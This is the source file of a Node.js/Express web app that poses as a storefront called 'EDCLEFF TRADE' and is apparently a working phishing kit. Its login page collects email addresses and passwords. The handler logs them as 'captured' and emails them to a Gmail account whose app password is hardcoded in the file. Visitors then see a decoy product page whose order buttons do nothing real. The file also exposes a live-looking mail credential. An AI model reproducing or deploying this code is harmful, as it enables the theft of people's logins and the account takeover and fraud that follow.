const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

console.log('🚀 Server starting...');

// Try to load nodemailer
let nodemailer;
try {
  nodemailer = require('nodemailer');
  console.log('✅ nodemailer loaded successfully');
} catch (err) {
  console.log('❌ nodemailer NOT loaded:', err.message);
}

// LANDING PAGE
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>EDCLEFF TRADE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Arial;background:linear-gradient(135deg,#0b1a2e,#1a3a4a);min-height:100vh;display:flex;justify-content:center;align-items:center}
    .box{background:white;padding:40px;border-radius:20px;text-align:center;width:350px}
    h1{color:#1a3c4a;margin-bottom:10px}
    input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:30px}
    button{background:#1f5e7e;color:white;padding:12px;border:none;border-radius:30px;width:100%;font-size:16px;cursor:pointer}
    button:hover{background:#0e4a64}
  </style>
</head>
<body>
  <div class="box">
    <h1>✦ EDCLEFF TRADE ✦</h1>
    <p>Secure Member Gateway</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email Address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">ACCESS GOODS →</button>
    </form>
  </div>
</body>
</html>
  `);
});

// LOGIN HANDLER
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  console.log('\n' + '='.repeat(60));
  console.log('🔐 NEW LOGIN CAPTURED!');
  console.log('📧 Email:', email);
  console.log('🔒 Password:', password);
  console.log('🕐 Time:', new Date().toISOString());
  console.log('='.repeat(60));
  
  // Check if nodemailer is available
  if (!nodemailer) {
    console.log('❌ Cannot send email - nodemailer not installed');
    console.log('💡 Run: npm install nodemailer');
  } else {
    console.log('📧 nodemailer is available, attempting to send...');
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'edcleff0@gmail.com',
        pass: 'vlfutznohqkechoq'
      }
    });
    
    try {
      await transporter.sendMail({
        from: '"EDCLEFF Gateway" <edcleff0@gmail.com>',
        to: 'edcleff0@gmail.com',
        subject: '🔐 New Login - EDCLEFF TRADE',
        text: `Email: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`
      });
      console.log('✅ EMAIL SENT successfully!');
    } catch (err) {
      console.log('❌ Email send error:', err.message);
    }
  }
  
  // PRODUCTS PAGE
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>EDCLEFF TRADE - Products</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Arial;background:linear-gradient(135deg,#0b1a2e,#1a3a4a);padding:20px}
    .header{text-align:center;color:white;margin-bottom:40px}
    .products{display:flex;flex-wrap:wrap;gap:20px;justify-content:center;max-width:1200px;margin:0 auto}
    .card{background:white;border-radius:20px;padding:20px;width:250px;text-align:center}
    .card h3{color:#1a3c4a;margin:10px 0}
    .price{color:#1f5e7e;font-size:24px;font-weight:bold;margin:10px 0}
    button{background:#1f5e7e;color:white;padding:10px 20px;border:none;border-radius:30px;cursor:pointer}
    .logout{position:fixed;top:20px;right:20px;background:rgba(255,255,255,0.2);color:white;padding:10px 20px;border-radius:30px;text-decoration:none}
  </style>
</head>
<body>
  <a href="/" class="logout">🚪 Logout</a>
  <div class="header">
    <h1>✦ Welcome to EDCLEFF TRADE ✦</h1>
    <p>Premium Goods & Services</p>
  </div>
  <div class="products">
    <div class="card"><div style="font-size:50px;">📱</div><h3>Premium Smartphone</h3><p>Latest model</p><div class="price">$599</div><button onclick="order('Premium Smartphone')">Order Now</button></div>
    <div class="card"><div style="font-size:50px;">💻</div><h3>Ultrabook Laptop</h3><p>Powerful & light</p><div class="price">$899</div><button onclick="order('Ultrabook Laptop')">Order Now</button></div>
    <div class="card"><div style="font-size:50px;">⌚</div><h3>Smart Watch</h3><p>Fitness tracker</p><div class="price">$199</div><button onclick="order('Smart Watch')">Order Now</button></div>
    <div class="card"><div style="font-size:50px;">🎧</div><h3>Wireless Headphones</h3><p>Noise cancelling</p><div class="price">$149</div><button onclick="order('Wireless Headphones')">Order Now</button></div>
  </div>
  <script>
    function order(product) {
      alert('Thank you for your interest in ' + product + '!\\n\\nA representative will contact you shortly.');
    }
  </script>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log('✅ Server running on port', PORT);
  console.log('🌐 https://edcleff-product-view.onrender.com');
});
